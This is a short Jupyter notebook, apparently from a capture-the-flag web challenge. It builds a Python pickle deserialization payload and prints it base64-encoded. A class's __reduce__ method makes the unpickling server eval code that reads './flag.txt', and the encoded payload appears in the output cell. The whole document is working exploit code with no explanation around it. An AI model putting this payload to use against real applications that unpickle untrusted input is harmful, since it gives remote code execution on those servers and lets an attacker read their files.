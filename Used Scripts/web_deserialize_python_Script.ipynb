{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sz8Yrp4reW8I",
        "outputId": "45da467f-0ace-4743-d2d2-6eef732968d1"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "gASVPwAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIwZb3BlbignLi9mbGFnLnR4dCcpLnJlYWQoKZSFlFKUcy4=\n"
          ]
        }
      ],
      "source": [
        "import pickle, base64\n",
        "\n",
        "class test:\n",
        "    def __reduce__(self):\n",
        "        p=\"open('./flag.txt').read()\"\n",
        "        return (eval,(p,))\n",
        "\n",
        "rs={'name':test()}\n",
        "\n",
        "print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))"
      ]
    }
  ]
}